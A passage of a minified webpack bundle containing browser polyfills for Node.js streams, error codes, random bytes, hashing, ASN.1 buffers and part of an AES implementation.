                    if ((nb = utf8CheckByte(buf[j])) >= 0) return nb > 0 && (2 === nb ? (nb = 0) : (self.lastNeed = nb - 3)), nb;
                    return 0;
                })(this, buf, i);
                if (!this.lastNeed) return buf.toString("utf8", i);
                this.lastTotal = total;
                var end = buf.length - (total - this.lastNeed);
                return buf.copy(this.lastChar, 0, end), buf.toString("utf8", i, end);
            }),
            (StringDecoder.prototype.fillLast = function (buf) {
                if (this.lastNeed <= buf.length) return buf.copy(this.lastChar, this.lastTotal - this.lastNeed, 0, this.lastNeed), this.lastChar.toString(this.encoding, 0, this.lastTotal);
                buf.copy(this.lastChar, this.lastTotal - this.lastNeed, 0, buf.length), (this.lastNeed -= buf.length);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var pna = __webpack_require__(38),
            objectKeys =
                Object.keys ||
                function (obj) {
                    var keys = [];
                    for (var key in obj) keys.push(key);
                    return keys;
                };
        module.exports = Duplex;
        var util = Object.create(__webpack_require__(34));
        util.inherits = __webpack_require__(3);
        var Readable = __webpack_require__(91),
            Writable = __webpack_require__(50);
        util.inherits(Duplex, Readable);
        for (var keys = objectKeys(Writable.prototype), v = 0; v < keys.length; v++) {
            var method = keys[v];
            Duplex.prototype[method] || (Duplex.prototype[method] = Writable.prototype[method]);
        }
        function Duplex(options) {
            if (!(this instanceof Duplex)) return new Duplex(options);
            Readable.call(this, options),
                Writable.call(this, options),
                options && !1 === options.readable && (this.readable = !1),
                options && !1 === options.writable && (this.writable = !1),
                (this.allowHalfOpen = !0),
                options && !1 === options.allowHalfOpen && (this.allowHalfOpen = !1),
                this.once("end", onend);
        }
        function onend() {
            this.allowHalfOpen || this._writableState.ended || pna.nextTick(onEndNT, this);
        }
        function onEndNT(self) {
            self.end();
        }
        Object.defineProperty(Duplex.prototype, "writableHighWaterMark", {
            enumerable: !1,
            get: function () {
                return this._writableState.highWaterMark;
            },
        }),
            Object.defineProperty(Duplex.prototype, "destroyed", {
                get: function () {
                    return void 0 !== this._readableState && void 0 !== this._writableState && this._readableState.destroyed && this._writableState.destroyed;
                },
                set: function (value) {
                    void 0 !== this._readableState && void 0 !== this._writableState && ((this._readableState.destroyed = value), (this._writableState.destroyed = value));
                },
            }),
            (Duplex.prototype._destroy = function (err, cb) {
                this.push(null), this.end(), pna.nextTick(cb, err);
            });
    },
    function (module, exports) {
        module.exports = function (module) {
            return (
                module.webpackPolyfill ||
                    ((module.deprecate = function () {}),
                    (module.paths = []),
                    module.children || (module.children = []),
                    Object.defineProperty(module, "loaded", {
                        enumerable: !0,
                        get: function () {
                            return module.l;
                        },
                    }),
                    Object.defineProperty(module, "id", {
                        enumerable: !0,
                        get: function () {
                            return module.i;
                        },
                    }),
                    (module.webpackPolyfill = 1)),
                module
            );
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global, process) {
            var Buffer = __webpack_require__(5).Buffer,
                crypto = global.crypto || global.msCrypto;
            crypto && crypto.getRandomValues
                ? (module.exports = function (size, cb) {
                      if (size > 4294967295) throw new RangeError("requested too many random bytes");
                      var bytes = Buffer.allocUnsafe(size);
                      if (size > 0)
                          if (size > 65536) for (var generated = 0; generated < size; generated += 65536) crypto.getRandomValues(bytes.slice(generated, generated + 65536));
                          else crypto.getRandomValues(bytes);
                      if ("function" == typeof cb)
                          return process.nextTick(function () {
                              cb(null, bytes);
                          });
                      return bytes;
                  })
                : (module.exports = function () {
                      throw new Error("Secure random number generation is not supported by this browser.\nUse Chrome, Firefox or Internet Explorer 11");
                  });
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var codes = {};
        function createErrorType(code, message, Base) {
            Base || (Base = Error);
            var NodeError = (function (_Base) {
                var subClass, superClass;
                function NodeError(arg1, arg2, arg3) {
                    return (
                        _Base.call(
                            this,
                            (function (arg1, arg2, arg3) {
                                return "string" == typeof message ? message : message(arg1, arg2, arg3);
                            })(arg1, arg2, arg3)
                        ) || this
                    );
                }
                return (superClass = _Base), ((subClass = NodeError).prototype = Object.create(superClass.prototype)), (subClass.prototype.constructor = subClass), (subClass.__proto__ = superClass), NodeError;
            })(Base);
            (NodeError.prototype.name = Base.name), (NodeError.prototype.code = code), (codes[code] = NodeError);
        }
        function oneOf(expected, thing) {
            if (Array.isArray(expected)) {
                var len = expected.length;
                return (
                    (expected = expected.map(function (i) {
                        return String(i);
                    })),
                    len > 2
                        ? "one of ".concat(thing, " ").concat(expected.slice(0, len - 1).join(", "), ", or ") + expected[len - 1]
                        : 2 === len
                        ? "one of ".concat(thing, " ").concat(expected[0], " or ").concat(expected[1])
                        : "of ".concat(thing, " ").concat(expected[0])
                );
            }
            return "of ".concat(thing, " ").concat(String(expected));
        }
        createErrorType(
            "ERR_INVALID_OPT_VALUE",
            function (name, value) {
                return 'The value "' + value + '" is invalid for option "' + name + '"';
            },
            TypeError
        ),
            createErrorType(
                "ERR_INVALID_ARG_TYPE",
                function (name, expected, actual) {
                    var determiner, search, pos, msg;
                    if (
                        ("string" == typeof expected && ((search = "not "), expected.substr(!pos || pos < 0 ? 0 : +pos, search.length) === search)
                            ? ((determiner = "must not be"), (expected = expected.replace(/^not /, "")))
                            : (determiner = "must be"),
                        (function (str, search, this_len) {
                            return (void 0 === this_len || this_len > str.length) && (this_len = str.length), str.substring(this_len - search.length, this_len) === search;
                        })(name, " argument"))
                    )
                        msg = "The ".concat(name, " ").concat(determiner, " ").concat(oneOf(expected, "type"));
                    else {
                        var type = (function (str, search, start) {
                            return "number" != typeof start && (start = 0), !(start + search.length > str.length) && -1 !== str.indexOf(search, start);
                        })(name, ".")
                            ? "property"
                            : "argument";
                        msg = 'The "'.concat(name, '" ').concat(type, " ").concat(determiner, " ").concat(oneOf(expected, "type"));
                    }
                    return (msg += ". Received type ".concat(typeof actual));
                },
                TypeError
            ),
            createErrorType("ERR_STREAM_PUSH_AFTER_EOF", "stream.push() after EOF"),
            createErrorType("ERR_METHOD_NOT_IMPLEMENTED", function (name) {
                return "The " + name + " method is not implemented";
            }),
            createErrorType("ERR_STREAM_PREMATURE_CLOSE", "Premature close"),
            createErrorType("ERR_STREAM_DESTROYED", function (name) {
                return "Cannot call " + name + " after a stream was destroyed";
            }),
            createErrorType("ERR_MULTIPLE_CALLBACK", "Callback called multiple times"),
            createErrorType("ERR_STREAM_CANNOT_PIPE", "Cannot pipe, not readable"),
            createErrorType("ERR_STREAM_WRITE_AFTER_END", "write after end"),
            createErrorType("ERR_STREAM_NULL_VALUES", "May not write null values to stream", TypeError),
            createErrorType(
                "ERR_UNKNOWN_ENCODING",
                function (arg) {
                    return "Unknown encoding: " + arg;
                },
                TypeError
            ),
            createErrorType("ERR_STREAM_UNSHIFT_AFTER_END_EVENT", "stream.unshift() after end event"),
            (module.exports.codes = codes);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            var objectKeys =
                Object.keys ||
                function (obj) {
                    var keys = [];
                    for (var key in obj) keys.push(key);
                    return keys;
                };
            module.exports = Duplex;
            var Readable = __webpack_require__(83),
                Writable = __webpack_require__(87);
            __webpack_require__(3)(Duplex, Readable);
            for (var keys = objectKeys(Writable.prototype), v = 0; v < keys.length; v++) {
                var method = keys[v];
                Duplex.prototype[method] || (Duplex.prototype[method] = Writable.prototype[method]);
            }
            function Duplex(options) {
                if (!(this instanceof Duplex)) return new Duplex(options);
                Readable.call(this, options),
                    Writable.call(this, options),
                    (this.allowHalfOpen = !0),
                    options && (!1 === options.readable && (this.readable = !1), !1 === options.writable && (this.writable = !1), !1 === options.allowHalfOpen && ((this.allowHalfOpen = !1), this.once("end", onend)));
            }
            function onend() {
                this._writableState.ended || process.nextTick(onEndNT, this);
            }
            function onEndNT(self) {
                self.end();
            }
            Object.defineProperty(Duplex.prototype, "writableHighWaterMark", {
                enumerable: !1,
                get: function () {
                    return this._writableState.highWaterMark;
                },
            }),
                Object.defineProperty(Duplex.prototype, "writableBuffer", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState && this._writableState.getBuffer();
                    },
                }),
                Object.defineProperty(Duplex.prototype, "writableLength", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState.length;
                    },
                }),
                Object.defineProperty(Duplex.prototype, "destroyed", {
                    enumerable: !1,
                    get: function () {
                        return void 0 !== this._readableState && void 0 !== this._writableState && this._readableState.destroyed && this._writableState.destroyed;
                    },
                    set: function (value) {
                        void 0 !== this._readableState && void 0 !== this._writableState && ((this._readableState.destroyed = value), (this._writableState.destroyed = value));
                    },
                });
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer;
        function Hash(blockSize, finalSize) {
            (this._block = Buffer.alloc(blockSize)), (this._finalSize = finalSize), (this._blockSize = blockSize), (this._len = 0);
        }
        (Hash.prototype.update = function (data, enc) {
            "string" == typeof data && ((enc = enc || "utf8"), (data = Buffer.from(data, enc)));
            for (var block = this._block, blockSize = this._blockSize, length = data.length, accum = this._len, offset = 0; offset < length; ) {
                for (var assigned = accum % blockSize, remainder = Math.min(length - offset, blockSize - assigned), i = 0; i < remainder; i++) block[assigned + i] = data[offset + i];
                (offset += remainder), (accum += remainder) % blockSize == 0 && this._update(block);
            }
            return (this._len += length), this;
        }),
            (Hash.prototype.digest = function (enc) {
                var rem = this._len % this._blockSize;
                (this._block[rem] = 128), this._block.fill(0, rem + 1), rem >= this._finalSize && (this._update(this._block), this._block.fill(0));
                var bits = 8 * this._len;
                if (bits <= 4294967295) this._block.writeUInt32BE(bits, this._blockSize - 4);
                else {
                    var lowBits = (4294967295 & bits) >>> 0,
                        highBits = (bits - lowBits) / 4294967296;
                    this._block.writeUInt32BE(highBits, this._blockSize - 8), this._block.writeUInt32BE(lowBits, this._blockSize - 4);
                }
                this._update(this._block);
                var hash = this._hash();
                return enc ? hash.toString(enc) : hash;
            }),
            (Hash.prototype._update = function () {
                throw new Error("_update must be implemented by subclass");
            }),
            (module.exports = Hash);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var codes = {};
        function createErrorType(code, message, Base) {
            Base || (Base = Error);
            var NodeError = (function (_Base) {
                var subClass, superClass;
                function NodeError(arg1, arg2, arg3) {
                    return (
                        _Base.call(
                            this,
                            (function (arg1, arg2, arg3) {
                                return "string" == typeof message ? message : message(arg1, arg2, arg3);
                            })(arg1, arg2, arg3)
                        ) || this
                    );
                }
                return (superClass = _Base), ((subClass = NodeError).prototype = Object.create(superClass.prototype)), (subClass.prototype.constructor = subClass), (subClass.__proto__ = superClass), NodeError;
            })(Base);
            (NodeError.prototype.name = Base.name), (NodeError.prototype.code = code), (codes[code] = NodeError);
        }
        function oneOf(expected, thing) {
            if (Array.isArray(expected)) {
                var len = expected.length;
                return (
                    (expected = expected.map(function (i) {
                        return String(i);
                    })),
                    len > 2
                        ? "one of ".concat(thing, " ").concat(expected.slice(0, len - 1).join(", "), ", or ") + expected[len - 1]
                        : 2 === len
                        ? "one of ".concat(thing, " ").concat(expected[0], " or ").concat(expected[1])
                        : "of ".concat(thing, " ").concat(expected[0])
                );
            }
            return "of ".concat(thing, " ").concat(String(expected));
        }
        createErrorType(
            "ERR_INVALID_OPT_VALUE",
            function (name, value) {
                return 'The value "' + value + '" is invalid for option "' + name + '"';
            },
            TypeError
        ),
            createErrorType(
                "ERR_INVALID_ARG_TYPE",
                function (name, expected, actual) {
                    var determiner, search, pos, msg;
                    if (
                        ("string" == typeof expected && ((search = "not "), expected.substr(!pos || pos < 0 ? 0 : +pos, search.length) === search)
                            ? ((determiner = "must not be"), (expected = expected.replace(/^not /, "")))
                            : (determiner = "must be"),
                        (function (str, search, this_len) {
                            return (void 0 === this_len || this_len > str.length) && (this_len = str.length), str.substring(this_len - search.length, this_len) === search;
                        })(name, " argument"))
                    )
                        msg = "The ".concat(name, " ").concat(determiner, " ").concat(oneOf(expected, "type"));
                    else {
                        var type = (function (str, search, start) {
                            return "number" != typeof start && (start = 0), !(start + search.length > str.length) && -1 !== str.indexOf(search, start);
                        })(name, ".")
                            ? "property"
                            : "argument";
                        msg = 'The "'.concat(name, '" ').concat(type, " ").concat(determiner, " ").concat(oneOf(expected, "type"));
                    }
                    return (msg += ". Received type ".concat(typeof actual));
                },
                TypeError
            ),
            createErrorType("ERR_STREAM_PUSH_AFTER_EOF", "stream.push() after EOF"),
            createErrorType("ERR_METHOD_NOT_IMPLEMENTED", function (name) {
                return "The " + name + " method is not implemented";
            }),
            createErrorType("ERR_STREAM_PREMATURE_CLOSE", "Premature close"),
            createErrorType("ERR_STREAM_DESTROYED", function (name) {
                return "Cannot call " + name + " after a stream was destroyed";
            }),
            createErrorType("ERR_MULTIPLE_CALLBACK", "Callback called multiple times"),
            createErrorType("ERR_STREAM_CANNOT_PIPE", "Cannot pipe, not readable"),
            createErrorType("ERR_STREAM_WRITE_AFTER_END", "write after end"),
            createErrorType("ERR_STREAM_NULL_VALUES", "May not write null values to stream", TypeError),
            createErrorType(
                "ERR_UNKNOWN_ENCODING",
                function (arg) {
                    return "Unknown encoding: " + arg;
                },
                TypeError
            ),
            createErrorType("ERR_STREAM_UNSHIFT_AFTER_END_EVENT", "stream.unshift() after end event"),
            (module.exports.codes = codes);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            var objectKeys =
                Object.keys ||
                function (obj) {
                    var keys = [];
                    for (var key in obj) keys.push(key);
                    return keys;
                };
            module.exports = Duplex;
            var Readable = __webpack_require__(113),
                Writable = __webpack_require__(117);
            __webpack_require__(3)(Duplex, Readable);
            for (var keys = objectKeys(Writable.prototype), v = 0; v < keys.length; v++) {
                var method = keys[v];
                Duplex.prototype[method] || (Duplex.prototype[method] = Writable.prototype[method]);
            }
            function Duplex(options) {
                if (!(this instanceof Duplex)) return new Duplex(options);
                Readable.call(this, options),
                    Writable.call(this, options),
                    (this.allowHalfOpen = !0),
                    options && (!1 === options.readable && (this.readable = !1), !1 === options.writable && (this.writable = !1), !1 === options.allowHalfOpen && ((this.allowHalfOpen = !1), this.once("end", onend)));
            }
            function onend() {
                this._writableState.ended || process.nextTick(onEndNT, this);
            }
            function onEndNT(self) {
                self.end();
            }
            Object.defineProperty(Duplex.prototype, "writableHighWaterMark", {
                enumerable: !1,
                get: function () {
                    return this._writableState.highWaterMark;
                },
            }),
                Object.defineProperty(Duplex.prototype, "writableBuffer", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState && this._writableState.getBuffer();
                    },
                }),
                Object.defineProperty(Duplex.prototype, "writableLength", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState.length;
                    },
                }),
                Object.defineProperty(Duplex.prototype, "destroyed", {
                    enumerable: !1,
                    get: function () {
                        return void 0 !== this._readableState && void 0 !== this._writableState && this._readableState.destroyed && this._writableState.destroyed;
                    },
                    set: function (value) {
                        void 0 !== this._readableState && void 0 !== this._writableState && ((this._readableState.destroyed = value), (this._writableState.destroyed = value));
                    },
                });
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(179)();
    },
    function (module, exports) {
        (module.exports = function (obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }),
            (module.exports.__esModule = !0),
            (module.exports.default = module.exports);
    },
    function (module, exports) {
        function _typeof(obj) {
            return (
                (module.exports = _typeof =
                    "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
                        ? function (obj) {
                              return typeof obj;
                          }
                        : function (obj) {
                              return obj && "function" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
                          }),
                (module.exports.__esModule = !0),
                (module.exports.default = module.exports),
                _typeof(obj)
            );
        }
        (module.exports = _typeof), (module.exports.__esModule = !0), (module.exports.default = module.exports);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var inherits = __webpack_require__(3),
            MD5 = __webpack_require__(44),
            RIPEMD160 = __webpack_require__(47),
            sha = __webpack_require__(48),
            Base = __webpack_require__(17);
        function Hash(hash) {
            Base.call(this, "digest"), (this._hash = hash);
        }
        inherits(Hash, Base),
            (Hash.prototype._update = function (data) {
                this._hash.update(data);
            }),
            (Hash.prototype._final = function () {
                return this._hash.digest();
            }),
            (module.exports = function (alg) {
                return "md5" === (alg = alg.toLowerCase()) ? new MD5() : "rmd160" === alg || "ripemd160" === alg ? new RIPEMD160() : new Hash(sha(alg));
            });
    },
    function (module, exports, __webpack_require__) {
        function objectToString(o) {
            return Object.prototype.toString.call(o);
        }
        (exports.isArray = function (arg) {
            return Array.isArray ? Array.isArray(arg) : "[object Array]" === objectToString(arg);
        }),
            (exports.isBoolean = function (arg) {
                return "boolean" == typeof arg;
            }),
            (exports.isNull = function (arg) {
                return null === arg;
            }),
            (exports.isNullOrUndefined = function (arg) {
                return null == arg;
            }),
            (exports.isNumber = function (arg) {
                return "number" == typeof arg;
            }),
            (exports.isString = function (arg) {
                return "string" == typeof arg;
            }),
            (exports.isSymbol = function (arg) {
                return "symbol" == typeof arg;
            }),
            (exports.isUndefined = function (arg) {
                return void 0 === arg;
            }),
            (exports.isRegExp = function (re) {
                return "[object RegExp]" === objectToString(re);
            }),
            (exports.isObject = function (arg) {
                return "object" == typeof arg && null !== arg;
            }),
            (exports.isDate = function (d) {
                return "[object Date]" === objectToString(d);
            }),
            (exports.isError = function (e) {
                return "[object Error]" === objectToString(e) || e instanceof Error;
            }),
            (exports.isFunction = function (arg) {
                return "function" == typeof arg;
            }),
            (exports.isPrimitive = function (arg) {
                return null === arg || "boolean" == typeof arg || "number" == typeof arg || "string" == typeof arg || "symbol" == typeof arg || void 0 === arg;
            }),
            (exports.isBuffer = __webpack_require__(6).Buffer.isBuffer);
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            module.exports = function (a, b) {
                for (var length = Math.min(a.length, b.length), buffer = new Buffer(length), i = 0; i < length; ++i) buffer[i] = a[i] ^ b[i];
                return buffer;
            };
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            assert = __webpack_require__(11);
        function BlockHash() {
            (this.pending = null),
                (this.pendingTotal = 0),
                (this.blockSize = this.constructor.blockSize),
                (this.outSize = this.constructor.outSize),
                (this.hmacStrength = this.constructor.hmacStrength),
                (this.padLength = this.constructor.padLength / 8),
                (this.endian = "big"),
                (this._delta8 = this.blockSize / 8),
                (this._delta32 = this.blockSize / 32);
        }
        (exports.BlockHash = BlockHash),
            (BlockHash.prototype.update = function (msg, enc) {
                if (((msg = utils.toArray(msg, enc)), this.pending ? (this.pending = this.pending.concat(msg)) : (this.pending = msg), (this.pendingTotal += msg.length), this.pending.length >= this._delta8)) {
                    var r = (msg = this.pending).length % this._delta8;
                    (this.pending = msg.slice(msg.length - r, msg.length)), 0 === this.pending.length && (this.pending = null), (msg = utils.join32(msg, 0, msg.length - r, this.endian));
                    for (var i = 0; i < msg.length; i += this._delta32) this._update(msg, i, i + this._delta32);
                }
                return this;
            }),
            (BlockHash.prototype.digest = function (enc) {
                return this.update(this._pad()), assert(null === this.pending), this._digest(enc);
            }),
            (BlockHash.prototype._pad = function () {
                var len = this.pendingTotal,
                    bytes = this._delta8,
                    k = bytes - ((len + this.padLength) % bytes),
                    res = new Array(k + this.padLength);
                res[0] = 128;
                for (var i = 1; i < k; i++) res[i] = 0;
                if (((len <<= 3), "big" === this.endian)) {
                    for (var t = 8; t < this.padLength; t++) res[i++] = 0;
                    (res[i++] = 0), (res[i++] = 0), (res[i++] = 0), (res[i++] = 0), (res[i++] = (len >>> 24) & 255), (res[i++] = (len >>> 16) & 255), (res[i++] = (len >>> 8) & 255), (res[i++] = 255 & len);
                } else
                    for (res[i++] = 255 & len, res[i++] = (len >>> 8) & 255, res[i++] = (len >>> 16) & 255, res[i++] = (len >>> 24) & 255, res[i++] = 0, res[i++] = 0, res[i++] = 0, res[i++] = 0, t = 8; t < this.padLength; t++) res[i++] = 0;
                return res;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3),
            Reporter = __webpack_require__(64).Reporter,
            Buffer = __webpack_require__(62).Buffer;
        function DecoderBuffer(base, options) {
            Reporter.call(this, options), Buffer.isBuffer(base) ? ((this.base = base), (this.offset = 0), (this.length = base.length)) : this.error("Input not Buffer");
        }
        function EncoderBuffer(value, reporter) {
            if (Array.isArray(value))
                (this.length = 0),
                    (this.value = value.map(function (item) {
                        return EncoderBuffer.isEncoderBuffer(item) || (item = new EncoderBuffer(item, reporter)), (this.length += item.length), item;
                    }, this));
            else if ("number" == typeof value) {
                if (!(0 <= value && value <= 255)) return reporter.error("non-byte EncoderBuffer value");
                (this.value = value), (this.length = 1);
            } else if ("string" == typeof value) (this.value = value), (this.length = Buffer.byteLength(value));
            else {
                if (!Buffer.isBuffer(value)) return reporter.error("Unsupported type: " + typeof value);
                (this.value = value), (this.length = value.length);
            }
        }
        inherits(DecoderBuffer, Reporter),
            (exports.DecoderBuffer = DecoderBuffer),
            (DecoderBuffer.isDecoderBuffer = function (data) {
                if (data instanceof DecoderBuffer) return !0;
                return (
                    "object" == typeof data &&
                    Buffer.isBuffer(data.base) &&
                    "DecoderBuffer" === data.constructor.name &&
                    "number" == typeof data.offset &&
                    "number" == typeof data.length &&
                    "function" == typeof data.save &&
                    "function" == typeof data.restore &&
                    "function" == typeof data.isEmpty &&
                    "function" == typeof data.readUInt8 &&
                    "function" == typeof data.skip &&
                    "function" == typeof data.raw
                );
            }),
            (DecoderBuffer.prototype.save = function () {
                return { offset: this.offset, reporter: Reporter.prototype.save.call(this) };
            }),
            (DecoderBuffer.prototype.restore = function (save) {
                const res = new DecoderBuffer(this.base);
                return (res.offset = save.offset), (res.length = this.offset), (this.offset = save.offset), Reporter.prototype.restore.call(this, save.reporter), res;
            }),
            (DecoderBuffer.prototype.isEmpty = function () {
                return this.offset === this.length;
            }),
            (DecoderBuffer.prototype.readUInt8 = function (fail) {
                return this.offset + 1 <= this.length ? this.base.readUInt8(this.offset++, !0) : this.error(fail || "DecoderBuffer overrun");
            }),
            (DecoderBuffer.prototype.skip = function (bytes, fail) {
                if (!(this.offset + bytes <= this.length)) return this.error(fail || "DecoderBuffer overrun");
                const res = new DecoderBuffer(this.base);
                return (res._reporterState = this._reporterState), (res.offset = this.offset), (res.length = this.offset + bytes), (this.offset += bytes), res;
            }),
            (DecoderBuffer.prototype.raw = function (save) {
                return this.base.slice(save ? save.offset : this.offset, this.length);
            }),
            (exports.EncoderBuffer = EncoderBuffer),
            (EncoderBuffer.isEncoderBuffer = function (data) {
                if (data instanceof EncoderBuffer) return !0;
                return "object" == typeof data && "EncoderBuffer" === data.constructor.name && "number" == typeof data.length && "function" == typeof data.join;
            }),
            (EncoderBuffer.prototype.join = function (out, offset) {
                return (
                    out || (out = Buffer.alloc(this.length)),
                    offset || (offset = 0),
                    0 === this.length ||
                        (Array.isArray(this.value)
                            ? this.value.forEach(function (item) {
                                  item.join(out, offset), (offset += item.length);
                              })
                            : ("number" == typeof this.value ? (out[offset] = this.value) : "string" == typeof this.value ? out.write(this.value, offset) : Buffer.isBuffer(this.value) && this.value.copy(out, offset),
                              (offset += this.length))),
                    out
                );
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            void 0 === process || !process.version || 0 === process.version.indexOf("v0.") || (0 === process.version.indexOf("v1.") && 0 !== process.version.indexOf("v1.8."))
                ? (module.exports = {
                      nextTick: function (fn, arg1, arg2, arg3) {
                          if ("function" != typeof fn) throw new TypeError('"callback" argument must be a function');
                          var args,
                              i,
                              len = arguments.length;
                          switch (len) {
                              case 0:
                              case 1:
                                  return process.nextTick(fn);
                              case 2:
                                  return process.nextTick(function () {
                                      fn.call(null, arg1);
                                  });
                              case 3:
                                  return process.nextTick(function () {
                                      fn.call(null, arg1, arg2);
                                  });
                              case 4:
                                  return process.nextTick(function () {
                                      fn.call(null, arg1, arg2, arg3);
                                  });
                              default:
                                  for (args = new Array(len - 1), i = 0; i < args.length; ) args[i++] = arguments[i];
                                  return process.nextTick(function () {
                                      fn.apply(null, args);
                                  });
                          }
                      },
                  })
                : (module.exports = process);
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer;
        function asUInt32Array(buf) {
            Buffer.isBuffer(buf) || (buf = Buffer.from(buf));
            for (var len = (buf.length / 4) | 0, out = new Array(len), i = 0; i < len; i++) out[i] = buf.readUInt32BE(4 * i);
            return out;
        }
        function scrubVec(v) {
            for (; 0 < v.length; v++) v[0] = 0;
        }
        function cryptBlock(M, keySchedule, SUB_MIX, SBOX, nRounds) {
            for (
                var t0,
                    t1,
                    t2,
                    t3,
                    SUB_MIX0 = SUB_MIX[0],
                    SUB_MIX1 = SUB_MIX[1],
                    SUB_MIX2 = SUB_MIX[2],
                    SUB_MIX3 = SUB_MIX[3],
                    s0 = M[0] ^ keySchedule[0],
                    s1 = M[1] ^ keySchedule[1],
                    s2 = M[2] ^ keySchedule[2],
                    s3 = M[3] ^ keySchedule[3],
                    ksRow = 4,
                    round = 1;
                round < nRounds;
                round++
            )
                (t0 = SUB_MIX0[s0 >>> 24] ^ SUB_MIX1[(s1 >>> 16) & 255] ^ SUB_MIX2[(s2 >>> 8) & 255] ^ SUB_MIX3[255 & s3] ^ keySchedule[ksRow++]),
                    (t1 = SUB_MIX0[s1 >>> 24] ^ SUB_MIX1[(s2 >>> 16) & 255] ^ SUB_MIX2[(s3 >>> 8) & 255] ^ SUB_MIX3[255 & s0] ^ keySchedule[ksRow++]),
                    (t2 = SUB_MIX0[s2 >>> 24] ^ SUB_MIX1[(s3 >>> 16) & 255] ^ SUB_MIX2[(s0 >>> 8) & 255] ^ SUB_MIX3[255 & s1] ^ keySchedule[ksRow++]),
                    (t3 = SUB_MIX0[s3 >>> 24] ^ SUB_MIX1[(s0 >>> 16) & 255] ^ SUB_MIX2[(s1 >>> 8) & 255] ^ SUB_MIX3[255 & s2] ^ keySchedule[ksRow++]),
                    (s0 = t0),
                    (s1 = t1),
                    (s2 = t2),
                    (s3 = t3);
            return (
                (t0 = ((SBOX[s0 >>> 24] << 24) | (SBOX[(s1 >>> 16) & 255] << 16) | (SBOX[(s2 >>> 8) & 255] << 8) | SBOX[255 & s3]) ^ keySchedule[ksRow++]),
                (t1 = ((SBOX[s1 >>> 24] << 24) | (SBOX[(s2 >>> 16) & 255] << 16) | (SBOX[(s3 >>> 8) & 255] << 8) | SBOX[255 & s0]) ^ keySchedule[ksRow++]),
                (t2 = ((SBOX[s2 >>> 24] << 24) | (SBOX[(s3 >>> 16) & 255] << 16) | (SBOX[(s0 >>> 8) & 255] << 8) | SBOX[255 & s1]) ^ keySchedule[ksRow++]),
                (t3 = ((SBOX[s3 >>> 24] << 24) | (SBOX[(s0 >>> 16) & 255] << 16) | (SBOX[(s1 >>> 8) & 255] << 8) | SBOX[255 & s2]) ^ keySchedule[ksRow++]),
                [(t0 >>>= 0), (t1 >>>= 0), (t2 >>>= 0), (t3 >>>= 0)]
            );
        }
        var RCON = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54],
            G = (function () {
                for (var d = new Array(256), j = 0; j < 256; j++) d[j] = j < 128 ? j << 1 : (j << 1) ^ 283;
                for (var SBOX = [], INV_SBOX = [], SUB_MIX = [[], [], [], []], INV_SUB_MIX = [[], [], [], []], x = 0, xi = 0, i = 0; i < 256; ++i) {
                    var sx = xi ^ (xi << 1) ^ (xi << 2) ^ (xi << 3) ^ (xi << 4);
                    (sx = (sx >>> 8) ^ (255 & sx) ^ 99), (SBOX[x] = sx), (INV_SBOX[sx] = x);
                    var x2 = d[x],
                        x4 = d[x2],
                        x8 = d[x4],
                        t = (257 * d[sx]) ^ (16843008 * sx);
                    (SUB_MIX[0][x] = (t << 24) | (t >>> 8)),
                        (SUB_MIX[1][x] = (t << 16) | (t >>> 16)),
                        (SUB_MIX[2][x] = (t << 8) | (t >>> 24)),
                        (SUB_MIX[3][x] = t),
                        (t = (16843009 * x8) ^ (65537 * x4) ^ (257 * x2) ^ (16843008 * x)),
                        (INV_SUB_MIX[0][sx] = (t << 24) | (t >>> 8)),
                        (INV_SUB_MIX[1][sx] = (t << 16) | (t >>> 16)),
                        (INV_SUB_MIX[2][sx] = (t << 8) | (t >>> 24)),
                        (INV_SUB_MIX[3][sx] = t),
                        0 === x ? (x = xi = 1) : ((x = x2 ^ d[d[d[x8 ^ x2]]]), (xi ^= d[d[xi]]));
                }
                return { SBOX: SBOX, INV_SBOX: INV_SBOX, SUB_MIX: SUB_MIX, INV_SUB_MIX: INV_SUB_MIX };
            })();
        function AES(key) {
            (this._key = asUInt32Array(key)), this._reset();
        }
        (AES.blockSize = 16),
            (AES.keySize = 32),
            (AES.prototype.blockSize = AES.blockSize),
            (AES.prototype.keySize = AES.keySize),
            (AES.prototype._reset = function () {
                for (var keyWords = this._key, keySize = keyWords.length, nRounds = keySize + 6, ksRows = 4 * (nRounds + 1), keySchedule = [], k = 0; k < keySize; k++) keySchedule[k] = keyWords[k];
                for (k = keySize; k < ksRows; k++) {
                    var t = keySchedule[k - 1];
                    k % keySize == 0
                        ? ((t = (t << 8) | (t >>> 24)), (t = (G.SBOX[t >>> 24] << 24) | (G.SBOX[(t >>> 16) & 255] << 16) | (G.SBOX[(t >>> 8) & 255] << 8) | G.SBOX[255 & t]), (t ^= RCON[(k / keySize) | 0] << 24))
                        : keySize > 6 && k % keySize == 4 && (t = (G.SBOX[t >>> 24] << 24) | (G.SBOX[(t >>> 16) & 255] << 16) | (G.SBOX[(t >>> 8) & 255] << 8) | G.SBOX[255 & t]),
